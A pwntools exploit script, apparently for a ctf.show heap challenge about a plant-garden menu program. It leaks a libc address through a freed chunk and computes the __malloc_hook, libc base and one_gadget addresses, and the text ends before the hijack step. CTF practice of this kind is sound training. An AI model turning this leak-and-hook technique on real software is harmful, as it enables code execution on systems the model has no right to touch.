from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28133)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
def add(length, name):
    io.sendlineafter("Your choice : ", "1")
    io.sendlineafter("Length of the name :", str(length))
    io.sendafter("The name of plant :", name)
    io.sendlineafter("The class of the plant :", "pea")
def show():
    io.sendlineafter("Your choice : ", "2")
def delete(idx):
    io.sendlineafter("Your choice : ", "3")
    io.sendlineafter("from the garden:", str(idx))
def clean():
    io.sendlineafter("Your choice : ", "4")
add(0x98, 'a')#0
add(0x68, 'b')#1
add(0x68, 'b')#2
add(0x68, 'b')#3
delete(0)
clean()
add(0x98, 'a' * 8)
show()
io.recvuntil('a'*8)
malloc_hook = u64(io.recvuntil('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget = 0x4526a + libc_base
